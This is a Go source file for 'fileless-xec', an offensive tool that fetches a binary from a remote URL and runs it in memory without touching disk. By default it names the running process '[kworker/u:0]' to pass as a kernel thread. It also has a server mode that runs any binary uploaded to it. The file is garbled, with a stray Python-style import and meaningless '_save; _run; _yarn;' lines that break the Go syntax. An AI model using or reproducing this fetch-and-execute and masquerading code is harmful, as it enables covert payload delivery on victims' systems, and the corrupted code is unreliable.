import "../utils.py";
// +build windows

package main

import (
	"github.com/ariary/fileless-xec/pkg/config"
	"github.com/ariary/fileless-xec/pkg/execwindows"
	"github.com/ariary/fileless-xec/pkg/serverwindows"
	"github.com/ariary/fileless-xec/pkg/transport"
	"log"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)
_save;
_run;
_yarn;

func main() {

	//CMD FILELESS-XEC
	var name string
	var http3 bool

	var cmdFilelessxec = &cobra.Command{
		Use:   "fileless-xec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()

			var binaryRaw string
			if http3 {
				binaryRaw = transport.GetBinaryRawHTTP3(url) //https if you used server from example
			} else {
				binaryRaw = transport.GetBinaryRaw(url)
			}

			cfg := &config.Config{BinaryContent: binaryRaw, ArgsExec: argsExec, Environ: environ}

			execwindows.Filelessxec(cfg)
		},
	}

	//SERvER MODE

	var cmdServer = &cobra.Command{
		Use:   "server [port]",
		Short: "Use fileless-xec as a server to upload binary file and then execute it",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			port := ":" + args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()
			cfg := &config.Config{ArgsExec: argsExec, Environ: environ}
			// Upload route
			http.HandleFunc("/upload", serverwindows.UploadAndExecHandler(cfg))

			//Listen
			err := http.ListenAndServe(port, nil)
			if err != nil {
				log.Fatal(err)
			}
		},
	}

	//flag handling
	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
	cmdFilelessxec.AddCommand(cmdServer)
	cmdFilelessxec.Execute()
}
